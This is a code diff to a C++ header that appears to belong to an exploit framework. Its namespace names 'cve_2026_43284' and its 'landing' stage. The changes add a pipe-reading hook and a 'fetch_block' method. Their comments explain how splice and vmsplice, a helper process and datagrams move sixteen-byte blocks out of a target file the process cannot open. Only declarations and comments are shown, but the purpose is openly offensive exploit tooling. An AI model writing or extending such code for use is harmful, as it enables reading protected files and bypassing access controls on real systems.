@@ -35,11 +35,15 @@ namespace ghostlock::backend::cve_2026_43284::landing {
         [[nodiscard]] bool available() const noexcept { return read16 != nullptr; }
     };
 
-    /** Injected source for the ciphertext page when the target file cannot be opened at all. The
-     *  real binding runs the helper with its output on the write pipe; the helper splices the page
-     *  into that pipe itself. Only a full block counts; anything else fails the block closed. */
+    /** Injected source for a block this process cannot read itself: one run of the helper with its
+     *  standard output on a pipe of ours, which is where the helper writes the sixteen bytes at the
+     *  offset. The same entry serves both uses the write has -- the datagram's ciphertext page, and
+     *  the combined fetch where those same sixteen bytes are the preimage as well (see
+     *  RealSpliceIo::fetch_block). Only a full block counts; anything else fails the block closed. */
     struct HelperWriteSource final {
         void *ctx = nullptr;
+        /** Run the helper once with its standard output on @p pipe_write_fd.
+         *  @return exactly kBlockBytes when the helper moved the whole block, or a negative value. */
         long (*splice16)(void *ctx, int pipe_write_fd,
                          std::uint64_t offset) noexcept = nullptr;
 
@@ -67,12 +71,16 @@ namespace ghostlock::backend::cve_2026_43284::landing {
         /** Read up to len bytes at an offset. Returns the count, 0 at end of file, or -errno. */
         long (*read_at)(int fd, std::uint8_t *out, std::size_t len,
                         std::uint64_t offset) noexcept = nullptr;
+        /** Read up to len bytes from a pipe, where the helper's block arrives. Returns the count,
+         *  0 at end of file, or -errno. */
+        long (*read_pipe)(int fd, std::uint8_t *out, std::size_t len) noexcept = nullptr;
         /** close(2). Returns 0, or -errno. */
         int (*close_fd)(int fd) noexcept = nullptr;
 
         [[nodiscard]] bool available() const noexcept {
             return pipe2 != nullptr && splice != nullptr && vmsplice != nullptr &&
-                   send_datagram != nullptr && read_at != nullptr && close_fd != nullptr;
+                   send_datagram != nullptr && read_at != nullptr && read_pipe != nullptr &&
+                   close_fd != nullptr;
         }
     };
 
@@ -98,8 +106,24 @@ namespace ghostlock::backend::cve_2026_43284::landing {
         [[nodiscard]] long read_at(int fd, std::uint8_t *out, std::size_t size,
                                    std::uint64_t offset) noexcept override;
 
+        /** One block from the helper's pipe: a single run of the helper with its standard output on
+         *  a pipe this process reads, so the sixteen bytes it writes are at once the preimage and
+         *  the ciphertext the datagram carries. With a descriptor to read, this is the direct read
+         *  and nothing else.
+         *  @return exactly kBlockBytes on success; a short count, or a negative -errno, otherwise. */
+        [[nodiscard]] long fetch_block(int fd, std::uint8_t out[kBlockBytes],
+                                       std::uint64_t offset) noexcept override;
+
+        /** The ciphertext page travels in the datagram when there is no descriptor: fetch_block
+         *  brought those sixteen bytes back in the one helper run, so splice_one maps them out of
+         *  the frame instead of running the helper a second time. */
+        [[nodiscard]] bool page_in_frame() const noexcept override {
+            return file_fd_ < 0 && helper_.available();
+        }
+
         /** Send one datagram of @p size bytes: the in-memory bytes before the ciphertext slot, the
-         *  page spliced from the target at @p offset, then the in-memory remainder (the check).
+         *  page (spliced from the target at @p offset, or, with no descriptor, the same bytes the
+         *  one fetch returned, mapped out of the frame), then the in-memory remainder (the check).
          *  @return false when @p datagram is null, when the frame is too short to hold the page,
          *          when no page source can run, or when any step fails; then no datagram is sent. */
         [[nodiscard]] bool splice_one(int socket_fd, const std::uint8_t *datagram,
